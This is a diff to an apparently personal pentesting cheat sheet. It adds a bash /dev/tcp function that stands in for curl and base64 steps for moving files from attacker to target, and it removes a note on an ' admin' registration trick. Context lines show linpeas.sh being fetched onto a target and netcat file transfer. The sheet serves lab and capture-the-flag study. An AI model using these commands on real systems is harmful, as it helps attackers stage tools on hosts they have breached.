@@ -50,8 +50,8 @@ sender:
 nc -w 3 DESTINATION 1234 < FILE.NAME
 ```
 
-## HTTPSERVER
-### send data
+## TRANSFER DATA/FILES
+### send data via HTTP Server
 sender:
 ```bash
 python -m SimpleHTTPServer 8083
@@ -63,6 +63,27 @@ curl IPADRESSSENDER:8083/FILE.NAME
 curl 10.10.IP.IP:8083/linpeas.sh > lp.sh
 wget IPADRESSSENDER:8083/FILE.NAME
 ```
+if curl is not installed make your own!
+```bash
+$ function __curl() {
+read proto server path <<<$(echo ${1//// })
+DOC=/${path// //}
+HOST=${server//:*}
+PORT=${server//*:}
+[[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+exec 3<>/dev/tcp/${HOST}/$PORT
+echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+(while read line; do
+ [[ "$line" == $'\r' ]] && break
+done && cat) <&3
+exec 3>&-
+}
+```
+
+### send data via Base64 Encoding
+on attacker: `base64 -w 0 [FileName]`
+on target: `echo "[Base64EncodedFile]" | base64 -d > [FileName]` 
+
 
 ## MSF
 search: `search [SEARCHTERM]`\
@@ -75,13 +96,6 @@ move out of a session: <kbd>CTRL</kbd> + <kbd>z</kbd>
 ## CHECK IF SOMETHING IS EXECUTED
 attacker: `sudo tcpdump ip proto \icmp -i tun0`\
 target: `ping [local tun0 ip] -c 1`
-
-## BROKEN AUTHENTICATION
-password guessing/bruteforce\
-weak session cookies\
-registration of existing user “ admin” (with space) and gain all rights of “admin”
-1. try register as randomname
-2. if “randomname has already been taken” try register with “ randomname” and see what happens
 
 ## XML EXTERNAL ENTITY (XXE)
 try :
@@ -209,7 +223,7 @@ resize panel: hold <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>arrowkey</kbd>
 
 ## GOBUSTER
 ```bash
-./gobuster dir -u http://ADRESS/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+gobuster dir -u http://ADRESS/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 maybe mit +x php
 ```
 
